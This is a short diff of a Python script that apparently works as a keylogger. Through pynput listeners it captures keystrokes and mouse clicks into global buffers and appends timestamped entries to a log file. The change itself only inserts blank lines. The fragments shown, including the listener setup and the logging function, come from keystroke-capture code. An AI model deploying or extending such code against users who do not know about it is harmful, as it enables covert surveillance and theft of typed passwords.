@@ -32,6 +32,7 @@ def onPress(key):
     if key == Key.esc:
         return False
     
+
 def click(x, y, button, pressed):
     global fullog
     global words
@@ -44,15 +45,18 @@ def click(x, y, button, pressed):
     else:
         pass
 
+
 def save_to_file(message):
     timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     with open(log_file, 'a', encoding='utf-8') as f:
         f.write(f'[{timestamp}]\n{message}\n---\n')
 
+
 def main():
     with Listener(on_press=onPress) as k_listener, mouse.Listener(on_click=click) as m_listener:
         k_listener.join()
         m_listener.join()
+
 
 if __name__ == "__main__":
     main()
